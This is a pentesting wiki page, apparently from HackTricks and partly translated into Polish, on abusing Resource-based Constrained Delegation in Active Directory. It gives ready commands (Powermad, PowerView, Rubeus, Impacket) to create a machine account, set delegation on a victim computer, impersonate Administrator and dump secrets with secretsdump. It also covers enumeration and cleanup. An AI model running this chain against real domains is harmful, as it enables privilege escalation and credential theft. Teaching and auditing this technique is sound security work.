# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basics of Resource-based Constrained Delegation

This is similar to the basic [Constrained Delegation](constrained-delegation.md) but **instead** of giving permissions to an **object** to **impersonate any user against a machine**. Resource-based Constrain Delegation **sets** in **the object who is able to impersonate any user against it**.

W tym przypadku obiekt z ograniczeniem będzie miał atrybut _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ z nazwą użytkownika, który może impersonate dowolnego użytkownika przeciwko niemu.

Another important difference from this Constrained Delegation to the other delegations is that any user with **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) can set the **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (In the other forms of Delegation you needed domain admin privs).

### Nowe koncepcje

Back in Constrained Delegation it was told that the **`TrustedToAuthForDelegation`** flag inside the _userAccountControl_ value of the user is needed to perform a **S4U2Self.** But that's not completely truth.\
Rzeczywistość jest taka, że nawet bez tej wartości możesz wykonać **S4U2Self** przeciwko dowolnemu użytkownikowi jeśli jesteś **service** (masz SPN), ale jeśli **masz `TrustedToAuthForDelegation`** zwrócony TGS będzie **Forwardable**, a jeśli **nie masz** tego flagu zwrócony TGS **nie będzie** **Forwardable**.

However, if the **TGS** used in **S4U2Proxy** is **NOT Forwardable** trying to abuse a **basic Constrain Delegation** it **won't work**. But if you are trying to exploit a **Resource-Based constrain delegation, it will work**.

### Struktura ataku

> If you have **write equivalent privileges** over a **Computer** account you can obtain **privileged access** in that machine.

Załóżmy, że atakujący ma już **write equivalent privileges over the victim computer**.

1. Atakujący **kompromituje** konto, które ma **SPN** lub **tworzy jedno** („Service A”). Zauważ, że **dowolny** _Admin User_ bez dodatkowych uprawnień może **utworzyć** do 10 obiektów Computer (**_MachineAccountQuota_**) i ustawić im **SPN**. Atakujący może więc po prostu stworzyć obiekt Computer i ustawić SPN.
2. Atakujący **nadużywa swoich uprawnień WRITE** nad komputerem ofiary (ServiceB), aby skonfigurować **resource-based constrained delegation**, zezwalając ServiceA na impersonate dowolnego użytkownika przeciwko temu komputerowi ofiary (ServiceB).
3. Atakujący używa Rubeus, aby wykonać **pełny S4U attack** (S4U2Self i S4U2Proxy) z Service A do Service B dla użytkownika **z uprzywilejowanym dostępem do Service B**.
1. S4U2Self (z kompromitowanego/stworzonego konta SPN): Poproś o **TGS of Administrator to me** (Not Forwardable).
2. S4U2Proxy: Użyj **not Forwardable TGS** z poprzedniego kroku, aby poprosić o **TGS** od **Administrator** do **victim host**.
3. Nawet jeśli używasz not Forwardable TGS, ponieważ eksploatujesz Resource-based constrained delegation, to zadziała.
4. Atakujący może wykonać **pass-the-ticket** i **impersonate** użytkownika, aby uzyskać **access to the victim ServiceB**.

To check the _**MachineAccountQuota**_ of the domain you can use:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Atak

### Tworzenie obiektu komputera

Możesz utworzyć obiekt komputera w domenie używając **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurowanie Resource-based Constrained Delegation

**Za pomocą modułu activedirectory PowerShell**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Korzystanie z powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Performing a complete S4U attack (Windows/Rubeus)

Najpierw utworzyliśmy nowy obiekt Computer z hasłem `123456`, więc potrzebujemy hasha tego hasła:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
To wydrukuje hashe RC4 i AES dla tego konta.\
Teraz atak może zostać przeprowadzony:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Możesz wygenerować więcej tickets dla różnych usług, pytając tylko raz, używając parametru `/altservice` Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Zwróć uwagę, że użytkownicy mają atrybut o nazwie "**Cannot be delegated**". Jeśli u użytkownika ten atrybut ma wartość True, nie będziesz mógł się za niego podszyć. Właściwość tę można zobaczyć w bloodhound.

### Narzędzia Linux: pełny łańcuch RBCD z Impacket (2024+)

Jeśli działasz na Linuxie, możesz przeprowadzić cały łańcuch RBCD przy użyciu oficjalnych narzędzi Impacket:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notatki
- Jeśli LDAP signing/LDAPS jest wymuszone, użyj `impacket-rbcd -use-ldaps ...`.
- Preferuj klucze AES; wiele nowoczesnych domen ogranicza RC4. Impacket i Rubeus obsługują wyłącznie przepływy AES.
- Impacket może przepisać `sname` ("AnySPN") dla niektórych narzędzi, ale w miarę możliwości uzyskaj poprawny SPN (np. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Uzyskiwanie dostępu

Ostatnia linia poleceń wykona **pełny atak S4U i wstrzyknie TGS** z konta Administrator na host ofiary w **pamięci**.\
W tym przykładzie zażądano TGS dla usługi **CIFS** z konta Administrator, więc będziesz w stanie uzyskać dostęp do **C$**:
```bash
ls \\victim.domain.local\C$
```
### Nadużywanie różnych biletów usługowych

Dowiedz się o [**dostępnych biletach usługowych**](silver-ticket.md#available-services).

## Enumeracja, audyt i sprzątanie

### Wyliczanie komputerów z skonfigurowanym RBCD

PowerShell (dekodowanie SD w celu rozwiązywania SID-ów):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (read lub flush za pomocą jednego polecenia):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Czyszczenie / reset RBCD

- PowerShell (wyczyść atrybut):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Błędy Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: To oznacza, że Kerberos jest skonfigurowany tak, żeby nie używać DES ani RC4 i dostarczasz tylko skrót RC4. Dostarcz Rubeusowi przynajmniej skrót AES256 (lub po prostu podaj rc4, aes128 i aes256). Example: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: To oznacza, że czas bieżącego komputera różni się od czasu DC i Kerberos nie działa prawidłowo.
- **`preauth_failed`**: To oznacza, że podana nazwa użytkownika + hashe nie działają do logowania. Mogłeś zapomnieć wpisać "$" w nazwie użytkownika podczas generowania hashy (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: To może oznaczać:
  - Użytkownik, którego próbujesz podszyć, nie ma dostępu do żądanej usługi (bo nie możesz się za niego podszyć lub ponieważ nie ma wystarczających uprawnień)
  - Żądana usługa nie istnieje (jeśli prosisz o bilet dla winrm, ale winrm nie działa)
  - Utworzony fakecomputer stracił swoje uprawnienia do podatnego serwera i musisz je mu przywrócić.
  - Nadużywasz klasycznego KCD; pamiętaj, że RBCD działa z non-forwardable S4U2Self tickets, podczas gdy KCD wymaga forwardable.

## Uwagi, relaye i alternatywy

- Możesz też zapisać RBCD SD przez AD Web Services (ADWS), jeśli LDAP jest filtrowany. Zobacz:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Łańcuchy relay Kerberos często kończą się na RBCD, aby uzyskać lokalny SYSTEM w jednym kroku. Zobacz praktyczne przykłady end-to-end:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Jeśli LDAP signing/channel binding są **wyłączone** i możesz utworzyć konto maszynowe, narzędzia takie jak **KrbRelayUp** mogą przekierować wymuszoną autoryzację Kerberos do LDAP, ustawić `msDS-AllowedToActOnBehalfOfOtherIdentity` dla twojego konta maszynowego na obiekcie komputera docelowego i natychmiast podszyć się pod **Administrator** przy użyciu S4U z off-host.

## Referencje

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (oficjalne): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Krótka ściągawka dla Linux z aktualną składnią: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
